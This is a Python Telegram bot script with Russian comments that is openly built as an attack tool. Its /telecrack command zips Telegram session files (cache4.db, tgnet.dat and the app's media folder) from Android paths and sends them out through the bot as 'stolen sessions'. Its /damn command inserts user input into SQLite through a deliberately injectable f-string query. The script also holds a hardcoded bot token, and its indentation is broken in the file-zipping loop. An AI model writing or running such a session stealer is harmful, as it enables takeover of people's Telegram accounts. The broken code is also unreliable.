from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import sqlite3
import logging
import io
import shutil
import os
from pathlib import Path
import zipfile

# Конфигурация ада
DB_NAME = "apocalypse.db"
TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"

# Инициализация логов
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY,
            soul TEXT,
            session_data BLOB
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Уязвимая вставка данных
async def sql_injection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_input = update.message.text.split(' ', 1)[1]
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        cursor.execute(f"INSERT INTO victims (soul) VALUES ('{user_input}')")
        conn.commit()

        cursor.execute("SELECT * FROM victims")
        await update.message.reply_text(f"🔥 Успех! Данные:\n{cursor.fetchall()}")
        conn.close()

    except Exception as e:
        await update.message.reply_text(f"💀 Ошибка: {str(e)}")

# Кража сессий
async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        paths = [
            "/data/data/org.telegram.messenger/files/cache4.db",
            "/data/data/org.telegram.messenger/files/tgnet.dat",
            "/sdcard/Android/media/org.telegram.messenger/"
        ]

        mem_zip = io.BytesIO()

        with zipfile.ZipFile(mem_zip, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
            for p in paths:
                path_obj = Path(p)
                if path_obj.exists():
                    if path_obj.is_file():
                        zf.write(path_obj, arcname=path_obj.name)
                    elif path_obj.is_dir():
                        for file in path_obj.rglob('*'):
    if file.is_file():
        zf.write(file, arcname=file.relative_to(path_obj))

mem_zip.seek(0)

        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile(mem_zip, filename="stealed_sessions.zip"),
            caption="🔥 Сессии Telegram украдены"
        )

    except Exception as e:
        await update.message.reply_text(f"💥 Ошибка: {str(e)}")

# Создание демона
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("damn", sql_injection))
app.add_handler(CommandHandler("telecrack", steal_sessions))

print("🔥 Ад активирован. Используй команды /damn и /telecrack")
app.run_polling()
